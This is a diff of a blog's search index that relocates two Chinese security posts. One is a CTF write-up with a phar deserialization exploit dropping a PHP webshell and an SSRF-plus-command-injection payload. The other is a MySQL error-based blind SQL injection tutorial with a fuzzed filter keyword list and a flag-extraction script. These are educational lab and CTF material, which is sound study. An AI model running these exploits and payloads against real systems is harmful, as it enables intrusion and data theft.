@@ -9616,330 +9616,8 @@ echo urlencode(serialize($a));</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>Desctf12月月赛</title>
-    <url>//articles/desctf12.html</url>
-    <content><![CDATA[<h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>题目给出源码：</p>
-<pre><code class="php"> &lt;?php
-error_reporting(E_ALL);
-$sandbox = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
-if(!is_dir($sandbox)) {
-    mkdir($sandbox);
-}
-include_once(&#39;template.php&#39;);
-$template = array(&#39;tp1&#39;=&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;=&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;=&gt;&#39;tp3.tpl&#39;);
-if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) {
-    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);
-} else {
-    highlight_file(__file__);
-    die();
-}
-if(isset($_GET[&#39;tp&#39;])) {
-    $tp = $_GET[&#39;tp&#39;];
-    if (array_key_exists($tp, $template) === FALSE) {
-        echo &quot;No! You only have 3 template to reader&quot;;
-        die();
-    }
-    $content = file_get_contents($template[$tp]);
-    $temp = new Template($content);
-} else {
-    echo &quot;Please choice one template to reader&quot;;
-}
-?&gt; </code></pre>
-<ul>
-<li>这里存在一个变量覆盖<code>extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);</code>，只需覆盖<code>$template</code></li>
-</ul>
-<p>即可,读取任意文件，直接读取template.php,得到源码：</p>
-<pre><code class="PHP">http://8.129.41.25:10305/?var[template][a]=template.php&amp;tp=a</code></pre>
-<ul>
-<li>template.php</li>
-</ul>
-<pre><code class="PHP">&lt;?php
-class Template{
-    public $content;
-    public $pattern;
-    public $suffix;
-
-    public function __construct($content){
-        $this-&gt;content = $content;
-        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
-        $this-&gt;suffix = &quot;.html&quot;;
-    }
-
-    public function __destruct() {
-        $this-&gt;render();
-    }
-    public function render() {
-        while (True) {
-            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1) 
-                break;
-            global ${$matches[1]};
-
-            if(isset(${$matches[1]})) {
-                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
-            } 
-            else{
-                break;
-            }
-        }
-        if(strlen($this-&gt;suffix)&gt;5) {
-            echo &quot;error suffix&quot;;
-            die();
-        }
-        $filename = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
-        file_put_contents($filename, $this-&gt;content);
-        echo &quot;Your html file is in &quot; . $filename;
-    }
-}
-
-?&gt;</code></pre>
-<p>源码比较简单，在前面的源码通过<code>file_getcontents</code>读取到内容之后传入<code>Template</code>类再写入文件。由于<code>file_getcontents</code>的参数完全可控，我们可以远程下载文件到靶机，并且可以使用phar反序列化可以控制<code>suffix</code>属性，把写入文件的后缀改成PHP，导致rce.</p>
-<p>Exp:</p>
-<pre><code class="php">&lt;?php
-class Template{
- public $content;
- public $pattern;
- public $suffix;
-
- public function __construct($content){
-  $this-&gt;content = $content;
-  $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
-  $this-&gt;suffix = &quot;.php&quot;;
- }
-}
-    @unlink(&quot;test.phar&quot;);
-    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
-    $phar-&gt;startBuffering();
-    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
-    $o = new Template(&quot;&lt;?php system(\$_GET[_]);?&gt;&quot;);
-    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
-    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
-    $phar-&gt;stopBuffering();
-?&gt;</code></pre>
-<ul>
-<li>下载到靶机：</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175549@2x.png" alt="WX20201225-175549@2x"></p>
-<ul>
-<li>反序列化</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175738@2x.png" alt="WX20201225-175738@2x"></p>
-<ul>
-<li>读取flag</li>
-</ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175957@2x.png" alt="WX20201225-175957@2x"></p>
-<h1 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h1><p>源码：</p>
-<pre><code class="javascript">/routes/index.js
-var express = require(&#39;express&#39;);
-var config = require(&#39;../config&#39;);
-var url=require(&#39;url&#39;);
-var child_process=require(&#39;child_process&#39;);
-var fs=require(&#39;fs&#39;);
-var request=require(&#39;request&#39;);
-var router = express.Router();
-
-
-var blacklist=[&#39;127.0.0.1.xip.io&#39;,&#39;::ffff:127.0.0.1&#39;,&#39;127.0.0.1&#39;,&#39;0&#39;,&#39;localhost&#39;,&#39;0.0.0.0&#39;,&#39;[::1]&#39;,&#39;::1&#39;];
-
-router.get(&#39;/&#39;, function(req, res, next) {
-    res.json({});
-});
-
-router.get(&#39;/debug&#39;, function(req, res, next) {
-    console.log(req.ip);
-    if(blacklist.indexOf(req.ip)!=-1){
-        console.log(&#39;res&#39;);
-    var u=req.query.url.replace(/[\&quot;\&#39;]/ig,&#39;&#39;);
-    console.log(url.parse(u).href);
-    let log=`echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log`;
-    console.log(log);
-    child_process.exec(log);
-    res.json({data:fs.readFileSync(&#39;/tmp/log&#39;).toString()});
-    }else{
-        res.json({});
-    }
-});
-
-
-router.post(&#39;/debug&#39;, function(req, res, next) {
-    console.log(req.body);
-    if(req.body.url !== undefined) {
-        var u = req.body.url;
-    var urlObject=url.parse(u);
-    if(blacklist.indexOf(urlObject.hostname) == -1){
-        var dest=urlObject.href;
-        request(dest,(err,result,body)=&gt;{
-            res.json(body);
-        })
-    }
-    else{
-        res.json([]);
-    }
-    }
-});
-module.exports = router;</code></pre>
-<ul>
-<li><p>GET 的debug路由中有一个命令执行，会将结果写入<code>/tmp/log</code>,但是要进入这个命令执行的分支必须通过ip黑名单的检测。`blacklist.indexOf(req.ip)!=-1。</p>
-</li>
-<li><p>我们在来看POST的debug路由很明显是一个SSRF。这里传递一个参数url,URL经过：url.parse解码后hostname不能再黑名单中。黑名单过滤的不全我们完全可以用十进制胡总八进制的方式绕过例如：<code>http://2130706433/</code>、<code>http://0177.0.0.01/</code></p>
-</li>
-<li><p>绕过SSRF之后我们就是要闭合单引号来执行多条命令了，这里有一个trick在<code>@</code>符号之前输入<code>%27</code>，会经过url解码变成单引号。</p>
-</li>
-</ul>
-<p>所以最终payload是：</p>
-<pre><code>url= http://2130706433:10300/debug?url=http://%2527@1;cp$IFS$9/flag$IFS$9/tmp/log;%23</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG9620.png" alt="WechatIMG9620"></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>一种基于运行错误的Bool型盲注原理剖析</title>
-    <url>//articles/spatial_functions_blind_inject.html</url>
-    <content><![CDATA[<h3 id="一种基于运行错误的Bool型盲注原理剖析"><a href="#一种基于运行错误的Bool型盲注原理剖析" class="headerlink" title="一种基于运行错误的Bool型盲注原理剖析"></a>一种基于运行错误的Bool型盲注原理剖析</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>文章首发于<strong>i春秋</strong></p>
-<p>老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。</p>
-<pre><code>靶机Docker镜像：gqleung/spatial_functions_blind_inject</code></pre><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
-<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
-<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a><span id="spatial">Spatial Functions</span></h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
-<p>以<code>ST_GeomFromText</code>为例：</p>
-<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
-<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
-+---------------------------------------------------+
-| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
-+---------------------------------------------------+
-|                                                 0 |
-+---------------------------------------------------+
-1 row in set (0.00 sec)</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
-<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
-<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
-ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
-<ul>
-<li>注意在Mysql5.7.6以上版本 ST_X、ST_GeomFromText已经被弃用，使用<code>ST_GeomFromText(&#39;POINT(mads)&#39;)</code>代替即可</li>
-</ul>
-<p>总结，其他可用的函数：</p>
-<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
-SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
-SELECT IF({}, ST_X(MADS), 0);
-SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
-SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
-<p>我们再来看我们的靶机<code>(Docker镜像：gqleung/tmd_sz_fsl)</code></p>
-<p>经过fuzz可以发现这个靶机不论参数传递数字都是会返回同一张图，但是如果存在被ban掉的字符会返回如下图：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-014859@2x.png" alt="WX20210126-014859@2x"></p>
-<p>我们可以借此FUZZ出被ban掉的关键字：</p>
-<pre><code class="MYSQL">union、*、&#39;、&quot;、substr、mid、=、like、into、file、sleep、benchmark、 、^、or、、、、&amp;、&gt;、&lt;、#、-、ascii、ord、floor、extractvalue、updatexml、if、rp、rep、GET_LOCK、info</code></pre>
-<ul>
-<li><p>这里过滤了空格，这里可以直接用<code>\t</code>来代替空格，URL编码后是%09,在写脚本时候可以使用TAB键来代替。</p>
-</li>
-<li><p>过滤了单双引号，可以使用十六进制来代替字符串。</p>
-</li>
-<li><p>过滤了<code>if</code>可以使用<code>case when....then....else...end</code>代替</p>
-</li>
-<li><p>过滤了等于号、大于、小于、减号、like、我们可以使用正则表达式来判断也就是regexp</p>
-</li>
-</ul>
-<p>我们通过上面所讲解的<code>ST_GeomFromText</code>,结合上述过滤考点，构造如下payload,当然空格要用%09代替。</p>
-<pre><code>index.php?cat=1%09and%09IF(0,ST_X(ST_GeomFromText(0x504F494E54286D61647329)),0)</code></pre><p>如果if表达式为false可以发现返回正常的页面：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020116@2x.png" alt="WX20210126-020116@2x"></p>
-<p>若if表达式为true,那么将会返回运行错误的页面：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-020240@2x.png" alt="WX20210126-020240@2x"></p>
-<p>据此编写Python脚本：</p>
-<pre><code class="PYTHON">#author：Gqleung
-#Email:  admin@plasf.cn
-#blog:   http://www.plasf.cn
-
-import requests
-
-def ord2hex(string):
-    result = &quot;&quot;
-    for i in string:
-        r = hex(ord(i));
-        r = r.replace(&#39;0x&#39;,&#39;&#39;)
-        result = result+r
-    return &#39;0x&#39;+result
-
-url = &quot;http://47.98.234.232:28076/index.php?cat=&quot;
-tables = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-}{&#39;
-result=&quot;&quot;
-for i in range(1,70):
-    for j in tables:
-        if j ==&quot;{&quot; or j==&quot;}&quot;:
-            j=&#39;\\&#39;+j
-        payload = &quot;1    and    IF((select    flag    from    flag)    regexp    binary    %s,    ST_X(ST_GeomFromText(0x504F494E54286D61647329)),    0)&quot;%(ord2hex(&quot;^&quot;+result+j))
-        r = requests.get(url+payload);
-        if &#39;cat&#39; not in r.text:
-            result=result+j
-            print(result.replace(&#39;\\&#39;,&#39;&#39;))
-            break</code></pre>
-<p>运行结果：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-021628@2x.png" alt="WX20210126-021628@2x"></p>
-<h4 id="FLOOR-X"><a href="#FLOOR-X" class="headerlink" title="FLOOR(X)"></a>FLOOR(X)</h4><p>咱们先了解<a href="#floor">主键重复报错注入</a>的原理</p>
-<h4 id="主键重复报错注入"><a href="#主键重复报错注入" class="headerlink" title="主键重复报错注入"></a>主键重复报错注入</h4><h5 id="FLOOR-X-1"><a href="#FLOOR-X-1" class="headerlink" title="FLOOR(X)"></a><span id="floor">FLOOR(X)</span></h5><p>该函数返回X的最大整数值，但不能大于X，也就是向下取整。</p>
-<p>例如,下列语句5.20返回的值将会是5.</p>
-<pre><code class="mysql">select floor(5.20)</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-083818@2x.png" alt="WX20201225-083818@2x"></p>
-<p>我们先来看Payload再来分析其中的原理</p>
-<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
-<ul>
-<li>Q1为什么用<code>floor(rand(0)*2)</code>?</li>
-</ul>
-<p>要回答这个问题，必须从floor报错注入的原理理解：</p>
-<p>例如，user()中含有五条数据：</p>
-<pre><code class="mysql">select rand() from user</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093334@2x.png" alt="WX20201225-093334@2x"></p>
-<p>可以发现会随机生成小于0的随机数。当然<code>rand()*2</code>生成<code>0-1</code>的随机数</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-093851@2x.png" alt="WX20201225-093851@2x"></p>
-<p>加上floor就是取整。会生成0或者1的随机值：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094006@2x.png" alt="WX20201225-094006@2x"></p>
-<p>但是为什么用rand(0)呢？</p>
-<p>Rand()两次运行的结果，可以明显地看到rand()产生的结果是随机的。</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094117@2x.png" alt="WX20201225-094117@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094710@2x.png" alt="WX20201225-094710@2x"></p>
-<p>Rand(0)两次运行的结果，可以发现两次运行的结果完全一致，说明<code>rand(0)</code>是伪随机的。</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-094830@2x.png" alt="WX20201225-094830@2x"></p>
-<p>我们再来了解一下<code>group by</code> 的运作过程。</p>
-<blockquote>
-<p>GROUP BY 语句用于结合聚合函数，根据一个或多个列对结果集进行分组。</p>
-</blockquote>
-<p>例如:如下SQL语句：</p>
-<pre><code class="mysql">select id as &quot;number&quot;, contents as &quot;内容&quot; from cat group by number</code></pre>
-<p>执行该sql语句会生成一个新的虚拟表，group by 即指定虚拟表中的对应字段来作为主键。</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-131144@2x.png" alt="WX20210120-131144@2x"></p>
-<p>我们知道主键只能是唯一的，如果主键出现重复的情况就会发生报错，将重复的主键输出在报错信息中，我们回过头来看报错注入的Payload.</p>
-<pre><code class="mysql">select count(*),(concat(floor(rand(0)*2),(select user())))x from user group by x;</code></pre>
-<p>我们看到这里以x 为主键,<code>rand(0)*2</code>生成0-2之间的伪随机数，同时使用<code>floor</code>来取整，出现的只能是值为0或者1（当然前提是表所存储的记录条数要&gt;3条才有可能重复）。使用<code>concat</code>将要查询的内容拼接入主键，这样在报错时会将咱们想要的内容作为报错信息输出。</p>
-<p>例如：</p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210120-133637@2x.png" alt="WX20210120-133637@2x"></p>
-<p>注：输出字符长度限制为64个字符</p>
-<p>我们了解完FLOOR（X）报错注入原理后开始从FLOOR(X)报错注入盲注来简述其中的道理，我们直接从payload来看：</p>
-<pre><code class="mysql">select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);</code></pre>
-<p>我们知道floor(rand(0)*2)产生的随机数是伪随机数范围在0-1，如果将其参数的结果作为主键就会造成报错，假设我们用<code>if</code>语句来控制x是否作为主键呢？这就有可能造成不报错的情况，用此来作为报错注入盲注。通常情况与<a href="#spatial">Spatial Functions</a>报错注入盲注类似。</p>
-<pre><code class="mysql">mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(1,x,0);
-ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;
-mysql&gt; select count(*),floor(rand(0)*2)x from cat group by if(0,x,0);
-+----------+---+
-| count(*) | x |
-+----------+---+
-|        2 | 0 |
-+----------+---+
-1 row in set (0.00 sec)</code></pre>
-<h4 id="数据溢出型"><a href="#数据溢出型" class="headerlink" title="数据溢出型"></a>数据溢出型</h4><p>在报错注入中数据溢出的函数同样可用如下。</p>
-<pre><code class="mysql">mysql&gt; select pow(2,1024);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;pow(2,1024)&#39;
-mysql&gt; select cot(0);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;cot(0)&#39;
-mysql&gt; select exp(710);
-ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(710)&#39;</code></pre>
-<p>### </p>
-]]></content>
-      <tags>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>安恒月赛DASCTF三月娱乐赛</title>
-    <url>//articles/dasctf_web_3.html</url>
+    <url>//articles/dasctf202103.html</url>
     <content><![CDATA[<h1 id="ez-serialize"><a href="#ez-serialize" class="headerlink" title="ez_serialize"></a>ez_serialize</h1><ul>
 <li>这题二血</li>
 </ul>
@@ -10321,6 +9999,328 @@ for i in range(1,70):
 ]]></content>
       <tags>
         <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Desctf12月月赛</title>
+    <url>//articles/desctf12.html</url>
+    <content><![CDATA[<h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>题目给出源码：</p>
+<pre><code class="php"> &lt;?php
+error_reporting(E_ALL);
+$sandbox = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);
+if(!is_dir($sandbox)) {
+    mkdir($sandbox);
+}
+include_once(&#39;template.php&#39;);
+$template = array(&#39;tp1&#39;=&gt;&#39;tp1.tpl&#39;,&#39;tp2&#39;=&gt;&#39;tp2.tpl&#39;,&#39;tp3&#39;=&gt;&#39;tp3.tpl&#39;);
+if(isset($_GET[&#39;var&#39;]) &amp;&amp; is_array($_GET[&#39;var&#39;])) {
+    extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);
+} else {
+    highlight_file(__file__);
+    die();
+}
+if(isset($_GET[&#39;tp&#39;])) {
+    $tp = $_GET[&#39;tp&#39;];
+    if (array_key_exists($tp, $template) === FALSE) {
+        echo &quot;No! You only have 3 template to reader&quot;;
+        die();
+    }
+    $content = file_get_contents($template[$tp]);
+    $temp = new Template($content);
+} else {
+    echo &quot;Please choice one template to reader&quot;;
+}
+?&gt; </code></pre>
+<ul>
+<li>这里存在一个变量覆盖<code>extract($_GET[&#39;var&#39;], EXTR_OVERWRITE);</code>，只需覆盖<code>$template</code></li>
+</ul>
+<p>即可,读取任意文件，直接读取template.php,得到源码：</p>
+<pre><code class="PHP">http://8.129.41.25:10305/?var[template][a]=template.php&amp;tp=a</code></pre>
+<ul>
+<li>template.php</li>
+</ul>
+<pre><code class="PHP">&lt;?php
+class Template{
+    public $content;
+    public $pattern;
+    public $suffix;
+
+    public function __construct($content){
+        $this-&gt;content = $content;
+        $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+        $this-&gt;suffix = &quot;.html&quot;;
+    }
+
+    public function __destruct() {
+        $this-&gt;render();
+    }
+    public function render() {
+        while (True) {
+            if(preg_match($this-&gt;pattern, $this-&gt;content, $matches)!==1) 
+                break;
+            global ${$matches[1]};
+
+            if(isset(${$matches[1]})) {
+                $this-&gt;content = preg_replace($this-&gt;pattern, ${$matches[1]}, $this-&gt;content);
+            } 
+            else{
+                break;
+            }
+        }
+        if(strlen($this-&gt;suffix)&gt;5) {
+            echo &quot;error suffix&quot;;
+            die();
+        }
+        $filename = &#39;/var/www/html/uploads/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;/&quot; . md5($this-&gt;content) . $this-&gt;suffix;
+        file_put_contents($filename, $this-&gt;content);
+        echo &quot;Your html file is in &quot; . $filename;
+    }
+}
+
+?&gt;</code></pre>
+<p>源码比较简单，在前面的源码通过<code>file_getcontents</code>读取到内容之后传入<code>Template</code>类再写入文件。由于<code>file_getcontents</code>的参数完全可控，我们可以远程下载文件到靶机，并且可以使用phar反序列化可以控制<code>suffix</code>属性，把写入文件的后缀改成PHP，导致rce.</p>
+<p>Exp:</p>
+<pre><code class="php">&lt;?php
+class Template{
+ public $content;
+ public $pattern;
+ public $suffix;
+
+ public function __construct($content){
+  $this-&gt;content = $content;
+  $this-&gt;pattern = &quot;/{{([a-z]+)}}/&quot;;
+  $this-&gt;suffix = &quot;.php&quot;;
+ }
+}
+    @unlink(&quot;test.phar&quot;);
+    $phar = new Phar(&quot;test.phar&quot;);//后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);//设置stub
+    $o = new Template(&quot;&lt;?php system(\$_GET[_]);?&gt;&quot;);
+    $phar-&gt;setMetadata($o);//将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);//添加要压缩的文件
+    $phar-&gt;stopBuffering();
+?&gt;</code></pre>
+<ul>
+<li>下载到靶机：</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175549@2x.png" alt="WX20201225-175549@2x"></p>
+<ul>
+<li>反序列化</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175738@2x.png" alt="WX20201225-175738@2x"></p>
+<ul>
+<li>读取flag</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201225-175957@2x.png" alt="WX20201225-175957@2x"></p>
+<h1 id="easyjs"><a href="#easyjs" class="headerlink" title="easyjs"></a>easyjs</h1><p>源码：</p>
+<pre><code class="javascript">/routes/index.js
+var express = require(&#39;express&#39;);
+var config = require(&#39;../config&#39;);
+var url=require(&#39;url&#39;);
+var child_process=require(&#39;child_process&#39;);
+var fs=require(&#39;fs&#39;);
+var request=require(&#39;request&#39;);
+var router = express.Router();
+
+
+var blacklist=[&#39;127.0.0.1.xip.io&#39;,&#39;::ffff:127.0.0.1&#39;,&#39;127.0.0.1&#39;,&#39;0&#39;,&#39;localhost&#39;,&#39;0.0.0.0&#39;,&#39;[::1]&#39;,&#39;::1&#39;];
+
+router.get(&#39;/&#39;, function(req, res, next) {
+    res.json({});
+});
+
+router.get(&#39;/debug&#39;, function(req, res, next) {
+    console.log(req.ip);
+    if(blacklist.indexOf(req.ip)!=-1){
+        console.log(&#39;res&#39;);
+    var u=req.query.url.replace(/[\&quot;\&#39;]/ig,&#39;&#39;);
+    console.log(url.parse(u).href);
+    let log=`echo  &#39;${url.parse(u).href}&#39;&gt;&gt;/tmp/log`;
+    console.log(log);
+    child_process.exec(log);
+    res.json({data:fs.readFileSync(&#39;/tmp/log&#39;).toString()});
+    }else{
+        res.json({});
+    }
+});
+
+
+router.post(&#39;/debug&#39;, function(req, res, next) {
+    console.log(req.body);
+    if(req.body.url !== undefined) {
+        var u = req.body.url;
+    var urlObject=url.parse(u);
+    if(blacklist.indexOf(urlObject.hostname) == -1){
+        var dest=urlObject.href;
+        request(dest,(err,result,body)=&gt;{
+            res.json(body);
+        })
+    }
+    else{
+        res.json([]);
+    }
+    }
+});
+module.exports = router;</code></pre>
+<ul>
+<li><p>GET 的debug路由中有一个命令执行，会将结果写入<code>/tmp/log</code>,但是要进入这个命令执行的分支必须通过ip黑名单的检测。`blacklist.indexOf(req.ip)!=-1。</p>
+</li>
+<li><p>我们在来看POST的debug路由很明显是一个SSRF。这里传递一个参数url,URL经过：url.parse解码后hostname不能再黑名单中。黑名单过滤的不全我们完全可以用十进制胡总八进制的方式绕过例如：<code>http://2130706433/</code>、<code>http://0177.0.0.01/</code></p>
+</li>
+<li><p>绕过SSRF之后我们就是要闭合单引号来执行多条命令了，这里有一个trick在<code>@</code>符号之前输入<code>%27</code>，会经过url解码变成单引号。</p>
+</li>
+</ul>
+<p>所以最终payload是：</p>
+<pre><code>url= http://2130706433:10300/debug?url=http://%2527@1;cp$IFS$9/flag$IFS$9/tmp/log;%23</code></pre><p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG9620.png" alt="WechatIMG9620"></p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一种基于运行错误的Bool型盲注原理剖析</title>
+    <url>//articles/spatial_functions_blind_inject.html</url>
+    <content><![CDATA[<h3 id="一种基于运行错误的Bool型盲注原理剖析"><a href="#一种基于运行错误的Bool型盲注原理剖析" class="headerlink" title="一种基于运行错误的Bool型盲注原理剖析"></a>一种基于运行错误的Bool型盲注原理剖析</h3><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>文章首发于<strong>i春秋</strong></p>
+<p>老规矩，我已经将靶机封装到Docker镜像中供各位观众姥爷们食用。</p>
+<pre><code>靶机Docker镜像：gqleung/spatial_functions_blind_inject</code></pre><p>什么是<code>基于运行错误的Bool型盲注</code>？</p>
+<p>简单的说就是它能够通过MYSQL解释器检查，但是运行时候又会产生错的函数。我们可以用它来进行布尔型盲注。我们下面就来讲解一下一些能够通过MYSQL解释器的预检查却在运行时候出现错误的SQL函数。</p>
+<h4 id="Spatial-Functions"><a href="#Spatial-Functions" class="headerlink" title="Spatial Functions"></a><span id="spatial">Spatial Functions</span></h4><p><code>ST_GeomFromText</code>、<code>ST_MPointFromText</code>是两个可以从<code>文本</code>中解析Spatial function的函数，如果我们的语法各方面都复合mysql的规则，如果我们在解析文本中做手脚呢？MYSQL解释器不会检查一个字符串是否复合MYSQL语法要求，很明显这样我们就可以绕过MYSQL预检查，但是在运行时候又「恰逢其时」地出错，这样我们就可以进行Bool盲注了。需要注意的是<code>ST_GeomFromText</code>针对的是<code>POINT()</code>函数，<code>ST_MPointFromText</code>针对的是<code>MULTIPOINT()</code>函数的。</p>
+<p>以<code>ST_GeomFromText</code>为例：</p>
+<p>例如构造如下SQL语句,很明显POINT函数传入的必须是GIS中的地理坐标的数据类型，这里写入的是一个常量或者undefined类型，但是他却能正常运行。</p>
+<pre><code class="MYSQL">mysql&gt; SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
++---------------------------------------------------+
+| IF(0, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0) |
++---------------------------------------------------+
+|                                                 0 |
++---------------------------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-011441@2x.png" alt="WX20210126-011441@2x"></p>
+<p>假设我们将<code>if</code>的表达式改成<code>false</code>呢，很明显会执行中间的参数，POINT的数据类型错误会导致报错。</p>
+<pre><code class="mysql">mysql&gt; SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(gqleung)&#39;)), 0);
+ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20210126-012024@2x.png" alt="WX20210126-012024@2x"></p>
+<ul>
+<li>注意在Mysql5.7.6以上版本 ST_X、ST_GeomFromText已经被弃用，使用<code>ST_GeomFromText(&#39;POINT(mads)&#39;)</code>代替即可</li>
+</ul>
+<p>总结，其他可用的函数：</p>
+<pre><code class="MYSQL">SELECT IF({}, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);
+SELECT IF({}, ST_X(MADS), 0);
+SELECT IF({}, ST_MPointFromText(&#39;MADS&#39;),0);
+SELECT IF({}, ST_GeomFromText(&#39;MADS&#39;),0);</code></pre>
+<p>我们再来看我们的靶机<code>(Docker镜像：gqleung/tmd_sz_fsl)</code></p>
